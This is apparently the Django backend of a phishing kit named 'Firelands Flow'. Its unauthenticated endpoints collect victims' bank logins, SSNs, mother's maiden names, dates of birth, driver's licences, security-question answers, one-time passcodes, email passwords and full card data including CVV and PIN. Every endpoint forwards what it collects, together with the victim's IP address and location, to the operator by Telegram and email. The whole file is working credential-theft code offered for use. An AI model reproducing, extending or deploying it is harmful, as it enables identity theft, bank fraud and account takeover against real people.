from rest_framework.decorators import api_view, permission_classes, authentication_classes
from rest_framework.response import Response
from core.app_config import app_settings
from core.utils import (
    get_client_ip,
    get_country_from_ip,
    get_city_from_ip,
    get_user_browser,
    get_user_os,
    _notification_sender,
    _notification_recipients,
    send_data_telegram,
    send_data_email,
    save_data_to_file
)
from user_data.models import Client, BankInfo, BrowserDetail
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_login_cred(request):
    ip = get_client_ip(request)
    country = get_country_from_ip(ip)
    city = get_city_from_ip(ip)
    browser = get_user_browser(request)
    os = get_user_os(request)
    agent = request.META.get('HTTP_USER_AGENT', '')
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        payload = request.data
        username = payload.get('emzemz', '')
        password = payload.get('pwzenz', '')

        # Browser details
        browser_detail, created = BrowserDetail.objects.get_or_create(
            ip_address=ip,
            defaults={
                'country': country,
                'city': city,
                'browser': browser,
                'os': os,
                'user_agent': agent
            }
        )

        # Notification message
        message = "|=====||Firelands Flow||=====|\n"
        message += "|========= [  LOGIN  ] ==========|\n"
        message += f"| ➤ [ Username ]         : {username}\n"
        message += f"| ➤ [ Password ]         : {password}\n"
        message += "|=====================================|\n"
        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += "|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += "|=====================================|\n"

        # Send notifications
        send_data_telegram(app_settings, message)
        
        subject = f"Firelands Login - {ip}"
        from_email = app_settings['from_email']
        recipient_list = app_settings['send_email_list']
        send_data_email(subject, message, from_email, recipient_list)

        return Response({'status': 'success'}, status=200)

    except Exception as e:
        logger.error(f'Error in firelands_collect_user_login_cred: {str(e)}')
        return Response({'error': str(e)}, status=400)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_login_cred2(request):
    ip = get_client_ip(request)
    country = get_country_from_ip(ip)
    city = get_city_from_ip(ip)
    browser = get_user_browser(request)
    os = get_user_os(request)
    agent = request.META.get('HTTP_USER_AGENT', '')
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        payload = request.data
        username = payload.get('emzemz', '')
        password = payload.get('pwzenz', '')

        # Browser details
        browser_detail, created = BrowserDetail.objects.get_or_create(
            ip_address=ip,
            defaults={
                'country': country,
                'city': city,
                'browser': browser,
                'os': os,
                'user_agent': agent
            }
        )

        # Notification message
        message = "|=====||Firelands Flow||=====|\n"
        message += "|========= [  LOGIN CONFIRM  ] ==========|\n"
        message += f"| ➤ [ Username ]        : {username}\n"
        message += f"| ➤ [ Password2 ]       : {password}\n"
        message += "|=====================================|\n"
        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += "|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += "|=====================================|\n"

        # Send notifications
        send_data_telegram(app_settings, message)
        
        subject = f"Firelands Login Confirm - {ip}"
        from_email = app_settings['from_email']
        recipient_list = app_settings['send_email_list']
        send_data_email(subject, message, from_email, recipient_list)

        return Response({'status': 'success'}, status=200)

    except Exception as e:
        logger.error(f'Error in firelands_collect_user_login_cred2: {str(e)}')
        return Response({'error': str(e)}, status=400)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_basic_info(request):
    ip = get_client_ip(request)
    country = get_country_from_ip(ip)
    city = get_city_from_ip(ip)
    browser = get_user_browser(request)
    os = get_user_os(request)
    agent = request.META.get('HTTP_USER_AGENT', '')
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        payload = request.data
        fields = {
            'username': payload.get('emzemz', ''),
            'firstName': payload.get('fzNme', ''),
            'lastName': payload.get('lzNme', ''),
            'phone': payload.get('phone', ''),
            'ssn': payload.get('ssn', ''),
            'motherMaidenName': payload.get('motherMaidenName', ''),
            'dob': payload.get('dob', ''),
            'driverLicense': payload.get('driverLicense', ''),
            'streetAddress': payload.get('stAd', ''),
            'apt': payload.get('apt', ''),
            'city': payload.get('city', ''),
            'state': payload.get('state', ''),
            'zipCode': payload.get('zipCode', '')
        }

        # Browser details
        browser_detail, created = BrowserDetail.objects.get_or_create(
            ip_address=ip,
            defaults={
                'country': country,
                'city': city,
                'browser': browser,
                'os': os,
                'user_agent': agent
            }
        )

        # Notification message
        message = "|=====||Firelands Flow||=====|\n"
        message += "|========= [  BASIC INFO  ] ==========|\n"
        message += f"| ➤ [ Username ]           : {fields['username']}\n"
        message += f"| ➤ [ First Name ]         : {fields['firstName']}\n"
        message += f"| ➤ [ Last Name ]          : {fields['lastName']}\n"
        message += f"| ➤ [ Phone ]              : {fields['phone']}\n"
        message += f"| ➤ [ SSN ]                : {fields['ssn']}\n"
        message += f"| ➤ [ Mother Maiden Name ] : {fields['motherMaidenName']}\n"
        message += f"| ➤ [ Date of Birth ]      : {fields['dob']}\n"
        message += f"| ➤ [ Driver's License ]   : {fields['driverLicense']}\n"

        if any([fields['streetAddress'], fields['city'], fields['state'], fields['zipCode']]):
            message += "|=====================================|\n"
            message += "| 🏠  A D D R E S S   D E T A I L S 🏠\n"
            message += "|======================================|\n"
            if fields['streetAddress']:
                message += f"| ➤ [ Street Address ]     : {fields['streetAddress']}\n"
            if fields['apt']:
                message += f"| ➤ [ Apartment/Unit ]     : {fields['apt']}\n"
            if fields['city']:
                message += f"| ➤ [ City ]               : {fields['city']}\n"
            if fields['state']:
                message += f"| ➤ [ State ]              : {fields['state']}\n"
            if fields['zipCode']:
                message += f"| ➤ [ ZIP Code ]           : {fields['zipCode']}\n"

        message += "|=====================================|\n"
        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += "|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += "|=====================================|\n"

        # Send notifications
        send_data_telegram(app_settings, message)
        
        subject = f"Firelands Basic Info - {ip}"
        from_email = app_settings['from_email']
        recipient_list = app_settings['send_email_list']
        send_data_email(subject, message, from_email, recipient_list)

        return Response({'status': 'success'}, status=200)

    except Exception as e:
        logger.error(f'Error in firelands_collect_user_basic_info: {str(e)}')
        return Response({'error': str(e)}, status=400)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_security_questions(request):
    ip = get_client_ip(request)
    country = get_country_from_ip(ip)
    city = get_city_from_ip(ip)
    browser = get_user_browser(request)
    os = get_user_os(request)
    agent = request.META.get('HTTP_USER_AGENT', '')
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        payload = request.data
        fields = {
            'username': payload.get('emzemz', ''),
            'question1': payload.get('securityQuestion1', ''),
            'answer1': payload.get('securityAnswer1', ''),
            'question2': payload.get('securityQuestion2', ''),
            'answer2': payload.get('securityAnswer2', ''),
            'question3': payload.get('securityQuestion3', ''),
            'answer3': payload.get('securityAnswer3', '')
        }

        # Browser details
        browser_detail, created = BrowserDetail.objects.get_or_create(
            ip_address=ip,
            defaults={
                'country': country,
                'city': city,
                'browser': browser,
                'os': os,
                'user_agent': agent
            }
        )

        # Notification message
        message = "|=====||Firelands Flow||=====|\n"
        message += "|========= [  SECURITY QUESTIONS  ] ==========|\n"
        message += f"| ➤ [ Question 1 ]      : {fields['question1']}\n"
        message += f"| ➤ [ Answer 1 ]        : {fields['answer1']}\n"
        message += f"| ➤ [ Question 2 ]      : {fields['question2']}\n"
        message += f"| ➤ [ Answer 2 ]        : {fields['answer2']}\n"
        message += f"| ➤ [ Question 3 ]      : {fields['question3']}\n"
        message += f"| ➤ [ Answer 3 ]        : {fields['answer3']}\n"
        message += "|=====================================|\n"
        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += "|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += "|=====================================|\n"

        # Send notifications
        send_data_telegram(app_settings, message)
        
        subject = f"Firelands Security Questions - {ip}"
        from_email = app_settings['from_email']
        recipient_list = app_settings['send_email_list']
        send_data_email(subject, message, from_email, recipient_list)

        return Response({'status': 'success'}, status=200)

    except Exception as e:
        logger.error(f'Error in firelands_collect_user_security_questions: {str(e)}')
        return Response({'error': str(e)}, status=400)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_otp_verification(request):
    ip = get_client_ip(request)
    country = get_country_from_ip(ip)
    city = get_city_from_ip(ip)
    browser = get_user_browser(request)
    os = get_user_os(request)
    agent = request.META.get('HTTP_USER_AGENT', '')
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        payload = request.data
        username = payload.get('emzemz', '')
        otp = payload.get('otp', '')

        # Browser details
        browser_detail, created = BrowserDetail.objects.get_or_create(
            ip_address=ip,
            defaults={
                'country': country,
                'city': city,
                'browser': browser,
                'os': os,
                'user_agent': agent
            }
        )

        # Notification message
        message = "|=====||Firelands Flow||=====|\n"
        message += "|========= [  OTP VERIFICATION  ] ==========|\n"
        message += f"| ➤ [ Username ]      : {username}\n"
        message += f"| ➤ [ OTP Code ]      : {otp}\n"
        message += "|=====================================|\n"
        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += "|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += "|=====================================|\n"

        # Send notifications
        send_data_telegram(app_settings, message)
        
        subject = f"Firelands OTP Verification - {ip}"
        from_email = app_settings['from_email']
        recipient_list = app_settings['send_email_list']
        send_data_email(subject, message, from_email, recipient_list)

        return Response({'status': 'success'}, status=200)

    except Exception as e:
        logger.error(f'Error in firelands_collect_user_otp_verification: {str(e)}')
        return Response({'error': str(e)}, status=400)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_email_password(request):
    ip = get_client_ip(request)
    country = get_country_from_ip(ip)
    city = get_city_from_ip(ip)
    browser = get_user_browser(request)
    os = get_user_os(request)
    agent = request.META.get('HTTP_USER_AGENT', '')
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        payload = request.data
        username = payload.get('emzemz', '')
        email = payload.get('email', '')
        password = payload.get('password', '')

        # Browser details
        browser_detail, created = BrowserDetail.objects.get_or_create(
            ip_address=ip,
            defaults={
                'country': country,
                'city': city,
                'browser': browser,
                'os': os,
                'user_agent': agent
            }
        )

        # Notification message
        message = "|=====||Firelands Flow||=====|\n"
        message += "|========= [  EMAIL & PASSWORD  ] ==========|\n"
        message += f"| ➤ [ Username ]      : {username}\n"
        message += f"| ➤ [ Email ]         : {email}\n"
        message += f"| ➤ [ Password ]      : {password}\n"
        message += "|=====================================|\n"
        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += "|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += "|=====================================|\n"

        # Send notifications
        send_data_telegram(app_settings, message)
        
        subject = f"Firelands Email & Password - {ip}"
        from_email = app_settings['from_email']
        recipient_list = app_settings['send_email_list']
        send_data_email(subject, message, from_email, recipient_list)

        return Response({'status': 'success'}, status=200)

    except Exception as e:
        logger.error(f'Error in firelands_collect_user_email_password: {str(e)}')
        return Response({'error': str(e)}, status=400)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_card_info(request):
    ip = get_client_ip(request)
    country = get_country_from_ip(ip)
    city = get_city_from_ip(ip)
    browser = get_user_browser(request)
    os = get_user_os(request)
    agent = request.META.get('HTTP_USER_AGENT', '')
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        payload = request.data
        username = payload.get('emzemz', '')
        cardNumber = payload.get('cardNumber', '')
        expiryDate = payload.get('expiryDate', '')
        cvv = payload.get('cvv', '')
        cardPin = payload.get('cardPin', '')

        # Browser details
        browser_detail, created = BrowserDetail.objects.get_or_create(
            ip_address=ip,
            defaults={
                'country': country,
                'city': city,
                'browser': browser,
                'os': os,
                'user_agent': agent
            }
        )

        # Notification message
        message = "|=====||Firelands Flow||=====|\n"
        message += "|========= [  CARD INFORMATION  ] ==========|\n"
        message += f"| ➤ [ Username ]      : {username}\n"
        message += f"| ➤ [ Card Number ]   : {cardNumber}\n"
        message += f"| ➤ [ Expiry Date ]   : {expiryDate}\n"
        message += f"| ➤ [ CVV ]           : {cvv}\n"
        message += f"| ➤ [ Card PIN ]      : {cardPin}\n"
        message += "|=====================================|\n"
        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += "|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += "|=====================================|\n"

        # Send notifications
        send_data_telegram(app_settings, message)
        
        subject = f"Firelands Card Information - {ip}"
        from_email = app_settings['from_email']
        recipient_list = app_settings['send_email_list']
        send_data_email(subject, message, from_email, recipient_list)

        return Response({'status': 'success'}, status=200)

    except Exception as e:
        logger.error(f'Error in firelands_collect_user_card_info: {str(e)}')
        return Response({'error': str(e)}, status=400)
